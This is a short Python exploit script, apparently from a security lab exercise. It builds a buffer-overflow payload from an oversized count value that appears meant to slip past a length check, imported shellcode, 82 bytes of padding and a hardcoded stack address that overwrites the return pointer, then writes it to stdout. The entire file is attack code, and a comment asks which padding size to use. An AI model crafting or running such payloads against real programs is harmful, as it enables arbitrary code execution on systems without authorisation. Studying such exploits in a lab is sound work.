#!/usr/bin/env python3

from shellcode import shellcode
import sys

count = 0x400000000000000F #60
count_to_bytes = count.to_bytes(8, 'little')

# which padding size should I use?
buffer_address = 0x7ffffff0a330 
buffer_address_to_bytes = buffer_address.to_bytes(8, 'little')
padding = b"A" * 82

combined = count_to_bytes + shellcode + padding + buffer_address_to_bytes


sys.stdout.buffer.write(combined)